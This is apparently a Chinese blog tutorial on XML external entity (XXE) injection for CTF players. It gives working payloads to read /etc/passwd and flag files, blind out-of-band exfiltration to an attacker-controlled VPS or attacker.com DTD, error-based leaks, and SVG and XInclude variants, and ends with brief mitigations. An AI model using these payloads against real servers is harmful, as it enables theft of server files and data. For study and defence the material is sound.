# **CTF中的XXE注入**
# **1 XXE漏洞简介**
XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加
载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。
## **1.1 XML基础知识**
XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。
## **1.2 DTD基础知识介绍**
	• DTD（文档类型定义）的作用是定义XML文档的合法构建模块
	• DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。
	• 可以认为DTD定义了一种针对XML的格式描述，任何一个XML文件都可以引用。

```xml
<!--XML声明-->
<?xml version="1.0"?>
<!--文档类型定义-->
<!DOCTYPE note [  　　<!--定义此文档是 note 类型的文档-->
	<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
	<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
	<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
	<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
	<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]]]>
<!--文档元素-->
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
• PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。
• 如：<!ELEMENT name (#PCDATA)> 它表示在<name>和</name>标签之间可以插入字符或者子标签。这些字符将被解析器解析
• CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。
• 内部DTD文档：<!DOCTYPE 根元素  [定义内容]>
• 外部DTD文档：<!DOCTYPE 根元素  SYSTEM “DTD文件路径”>
• 内外部DTD文档结合：<!DOCTYPE 根元素  SYSTEM “DTD文件路径” [定义内容-]>
• 引用公共实体: <!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>
```
我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）

**通用实体**

用 &实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
	<!ENTITY file SYSTEM "file:///c:/windows/win.ini">
]>
<updateProfile>  
    <firstname>Joe</firstname>  
    <lastname>&file;</lastname>  
    ...
</updateProfile>
```
**参数实体：**

(1) 使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 % 实体名; 引用<br>
(2) 只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>
(3) 和通用实体一样，参数实体也可以外部引用<br>
```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
	<!ENTITY % file SYSTEM "file:///C:/windows/win.ini">
	<!ENTITY % remote SYSTEM "http://192.168.100.1/test.xml">
	%remote; %all; <!--  只有在 DTD 文件中，参数实体的声明才能引用其他实体 -->
]>
<root>&send;</root>
```
# **2 我们能做什么? XXE的利用**
## **2.1 有回显读本地敏感文件(Normal XXE)**
• **Payload**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root> <name>&xxe;</name> </root>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200222114016265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)

但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利, 那么有特殊符号的文件呢?

• **对于PHP来说，可以使用伪协议返回base64字符串**
```xml
<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE xxe [
	<!ELEMENT name ANY >
          <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
]>
 <root> <name>&xxe;</name> </root>
 ```
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200222114227237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)

• **使用CDATA不返回被解析的数据**

有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 <> & 或者
“ 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记，可以输入任意字符除了]]>不能嵌套。用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来。如何包裹呢？？？我们知道我们只有一种选择，就是使用 参数实体。
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
 <!ENTITY % start "<![CDATA[">   
 <!ENTITY % goodies SYSTEM "file:///etc/passwd">  
 <!ENTITY % end "]]>">  
 <!ENTITY % dtd SYSTEM "http://192.168.137.131:8081/evil.dtd">
%dtd; ]>
<roottag><name>&all;</name></roottag>

evil.dtd文件的内容为：
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200222114457796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)

**新的问题出现**

但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带

**新的解决方法**

想要外带就必须能发起请求，那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)

## **2.2 无回显读取本地敏感文件(Blind OOB XXE)**

**test.dtd**
```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.137.131:9999?p=%file;'>">
```
**Payload:**
```xml
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://192.168.137.131:8081/test.dtd">
%remote;%int;%send;
]>
```
我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200222114723266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)

问题1：带外数据通道的建立是使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系
直接在内部实体定义中引用另一个实体的方法如下，但是这种方法行不通，解析直接报错。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200222114807653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)

问题2：
但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE convert [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.137.131:9999?p=%file;'>">
%send;]>
即使用嵌套的方式也不行，测试发现报错PEReferences forbidden in internal subset in Entity PEReferences 指的是参数实体引用(Parameter Entity Reference)，禁止在内部Entity中引用参数实体。
```
**解决方案：**
将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。

**新的利用：**
所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议,如图所示:
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200222114956235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)

## **2.3 JSON content-type XXE**
正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击
原始请求和响应：
```html
HTTP Request:
POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/json
Content-Length: 38
{"search":"name","value":"netspitest"}

HTTP Response:
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 43
{"error": "no results for name netspitest"}
```
现在我们尝试将 Content-Type 修改为 application/xml
进一步请求和响应：
```html
HTTP Request:
POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/xml
Content-Length: 38
{"search":"name","value":"netspitest"}

HTTP Response:
HTTP/1.1 500 Internal Server Error
Content-Type: application/json
Content-Length: 127
{"errors":{"errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."}}
```
可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击
最终的请求和响应：
```xml
HTTP Request:
POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/xml
Content-Length: 288
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<search>name</search>
<value>&xxe;</value>
</root>

HTTP Response:
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 2467
{"error": "no results for name root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync....
```
## **2.4 报错回显类型XXE**
想象你有一个XXE。支持外部实体，但服务器的响应始终为空。在这种情况下，您有两种选择：基于错误和带外利用。基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。考虑以下基于错误的示例：
### **通过引用外部DTD文件**
**Request：**
```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
<!-- Contents of ext.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
**Response:**
```html
java.io.FileNotFoundException: /nonexistent/
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/usr/bin/nologin
daemon:x:2:2:daemon:/:/usr/bin/nologin
(No such file or directory)
```
### **通过引用本地DTD文件**
如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。
```xml
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;file://hhhhhhhh/?&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;send;
    '> 
    %remote;
]>
<message>1234</message>
```
但是虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的。
```xml
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ELEMENT message ANY>
    <!ENTITY % para1 SYSTEM "file:///flag">
    <!ENTITY % para '
        <!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">
        &#x25;para2;
    '>
    %para;
]>
<message>10</message
```
**各个平台本地DTD示例：**
```xml
Custom Linux System
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa 'Your DTD code'>
%local_dtd;

Custom Windows System
<!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
<!ENTITY % SuperClass '>Your DTD code<!ENTITY test "test"'>
%local_dtd;
```
## **2.5 SVG图片上传类型XXE**
有些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用XML或包含XML子组件。基于XML的格式的例子有DOCX等office文档格式和SVG等图像格式。
应用程序可能允许用户上载图像，并在上载后在服务器上处理或验证这些图像。即使应用程序希望接收PNG或JPEG等格式，所使用的图像处理库也可能支持SVG图像。由于SVG格式使用XML，攻击者可以提交恶意SVG图像，从而到达XXE漏洞的隐藏攻击面。
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ 
	<!ENTITY xxe SYSTEM "file:///etc/hostname" > 
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
## **2.6 XInclude类型XXE**
一些应用程序接收客户端提交的数据，将其嵌入到服务器端的XML文档中，然后解析文档。当客户端提交的数据被放入后端SOAP请求中，然后由后端SOAP服务处理时，就会出现这种情况。
在这种情况下，您无法执行经典的XXE攻击，因为您无法控制整个XML文档，因此无法定义或修改DOCTYPE元素。但是，您可以改用XInclude。XInclude是XML规范的一部分，它允许从子文档构建XML文档。您可以将XInclude攻击放在XML文档中的任何数据值中，因此可以在您仅控制放置到服务器端XML文档中的单个数据项的情况下执行攻击。
要执行XInclude攻击，需要引用XInclude命名空间并提供要包含的文件的路径。例如：
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
## **2.7 其他利用姿势**
**利用jar协议配合xxe获取临时文件的目录**<br>
jar:// 协议的格式：jar:{url}!{path}<br>
jar:http://vps:8080/jar.zip!/1.php<br>
如果jar.zip中不存在1.php 文件，则会报错，并在错误日志中打印临时文件目录<br>
netdoc:// 列目录，列出某个目录下的文件
# **3 XXE 如何防御**
**方案一：使用语言中推荐的禁用外部实体的方法**

**PHP：**
```php
libxml_disable_entity_loader(true);
```
**JAVA:**
```java
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities",false)
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities",false);
```
**Python：**
```python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```
# **4 参考资料**
【1】http://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/<br>
【2】https://www.freebuf.com/articles/web/97833.html<br>
【3】https://www.freebuf.com/vuls/207639.html<br>
【4】https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/<br>
